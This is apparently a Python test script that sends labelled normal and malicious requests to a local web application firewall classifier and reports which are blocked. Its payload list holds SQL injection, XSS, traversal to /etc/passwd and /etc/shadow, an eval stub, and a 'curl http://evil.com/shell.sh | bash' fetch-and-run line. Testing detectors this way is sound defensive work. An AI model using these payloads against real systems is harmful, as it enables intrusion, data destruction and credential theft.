import requests
import time
import json

url = "http://127.0.0.1:10001/predict"

payloads = [
    # Normal traffic
    {"name": "Normal Search", "q": "how to learn deep learning"},
    {"name": "Normal Page", "page": "about_us.html", "id": "123"},
    
    # SQLi
    {"name": "SQL Injection 1", "user": "admin' OR '1'='1", "pass": "password"},
    {"name": "SQL Injection 2", "id": "1; DROP TABLE users--"},
    
    # XSS
    {"name": "XSS Attack 1", "comment": "<script>alert('XSS')</script>"},
    {"name": "XSS Attack 2", "search": "\"><img src=x onerror=prompt(1)>"},
    
    # LFI/Traversal
    {"name": "Path Traversal", "file": "../../../../etc/passwd"},
    {"name": "LFI", "include": "/var/www/html/../../../etc/shadow"},
    
    # RCE
    {"name": "RCE Attack 1", "cmd": "eval(base64_decode('somepayload'))"},
    {"name": "RCE Attack 2", "exec": "curl http://evil.com/shell.sh | bash"},
]

print("Simulating attacker traffic against WAF Server...\n")

for p in payloads:
    test_name = p.pop("name")
    print(f"[*] Testing: {test_name}")
    print(f"    Payload: {p}")
    try:
        # We send as JSON so it's easier to parse, but the server supports both
        headers = {'Content-Type': 'application/json'}
        response = requests.post(url, data=json.dumps(p), headers=headers)
        result = response.json()
        
        status = result.get('status')
        attack_type = result.get('type')
        
        if status == "ATTACK":
            print(f"    [!] BLOCKED. Detected as: {attack_type.upper()}")
        else:
            print(f"    [+] ALLOWED. Status: {status.upper()} ({attack_type})")
            
    except Exception as e:
        print(f"    [-] Error: {e}")
    print("-" * 50)
    time.sleep(0.5)
